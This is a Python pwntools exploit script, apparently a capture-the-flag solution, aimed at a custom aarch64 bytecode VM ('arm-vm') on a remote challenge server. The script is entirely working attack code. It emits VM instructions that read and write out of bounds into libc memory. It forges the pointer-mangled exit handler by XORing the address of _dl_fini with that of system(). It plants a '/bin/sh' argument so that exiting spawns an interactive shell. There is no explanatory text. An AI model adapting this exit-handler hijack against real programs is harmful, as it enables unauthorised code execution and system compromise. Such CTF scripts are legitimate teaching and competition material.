from pwn import *
import time

context.terminal = ["tmux", "splitw", "-h"]
context.aslr = True

class Asm():
    def __init__(self):
        self.b = b""

    def lsl(self):
        self.b += p8(4)
    def lsr(self):
        self.b += p8(5)
    def add(self):
        self.b += p8(1)
    def eor(self):
        self.b += p8(3)

    def push_imm(self, imm):
        self.b += p8(6) + p64(imm)

    def dup_top(self):
        self.b += p8(7)

    def load(self, off):
        self.push_imm(off)
        self.b += p8(8)

    def store(self, off, data):
        self.push_imm(data)
        self.push_imm(off)
        self.b += p8(9)
    def storetop(self, off):
        self.push_imm(off)
        self.b += p8(9)

    def ret(self):
        self.b += p8(10)

# p = process('qemu-aarch64 ../deploy/app/target/aarch64-unknown-linux-gnu/release/arm-vm', shell=True)
p = remote("pwn.chall.pwnoh.io", 13384)
context.arch = "aarch64"
time.sleep(0.5)
# gdb.attach(('localhost', 6969), exe="target/aarch64-unknown-linux-gnu/release/arm-vm", gdbscript="""
# b main
# b *0x0000005500006cd0
# b *0x0000005501aa4028
# add-symbol-file /usr/aarch64-linux-gnu/lib/libc.so.6 -readnow -o 0x55018e0000
# c
# """)
time.sleep(0.5)
# p.interactive()

a = Asm()
# Need to push 0x7000 bytes, then we can overwrite a little further than that
a.push_imm(0)
for _ in range(0x7000//8):
    a.dup_top()

# Load 0x7000 corresponds to 0x19C008
def write64top(libc_off):
    libc_off -= 0x19C008
    assert libc_off > 0
    new_off = 0x7000 - (libc_off // 8)
    a.storetop(new_off)
def write64(libc_off, data):
    libc_off -= 0x19C008
    assert libc_off > 0
    new_off = 0x7000 - (libc_off // 8)
    a.store(new_off, u64(data))

def read64(libc_off):
    libc_off -= 0x19C008
    assert libc_off > 0
    new_off = 0x7000 - (libc_off // 8)
    a.load(new_off)

LIBC_BASE = 0x5501ad0000
off = LIBC_BASE - 0x55018d0000
# LIBC_BASE = 0x55018d0000
KNOWN_DL_FINI_ADDR = 0x550185c180 + off
KNOWN_SYSTEM_ADDR = LIBC_BASE+0x46d94
print(f"system: {hex(KNOWN_SYSTEM_ADDR)}")
def fix_ptr():
    a.push_imm(KNOWN_DL_FINI_ADDR)
    a.eor()
    a.push_imm(KNOWN_SYSTEM_ADDR)
    a.eor()

def write_bytes(libc_off, data):
    for i in range(0, len(data), 8):
        write64(libc_off+i, data[i:i+8])

print(hex(LIBC_BASE+0x19c730))
print(hex(LIBC_BASE+0x3cef0))

EXIT_HANDLE_FUNC_ADDR = 0x5501a6dca8 + off - LIBC_BASE
print(hex(EXIT_HANDLE_FUNC_ADDR))

read64(EXIT_HANDLE_FUNC_ADDR)
fix_ptr()
write64top(EXIT_HANDLE_FUNC_ADDR)

binsh_addr = LIBC_BASE + 0x14d9f8
write64(EXIT_HANDLE_FUNC_ADDR+8, p64(binsh_addr))

a.ret()

p.sendline(f"{len(a.b)}")
p.send(a.b)
p.sendline("1337")

p.interactive()




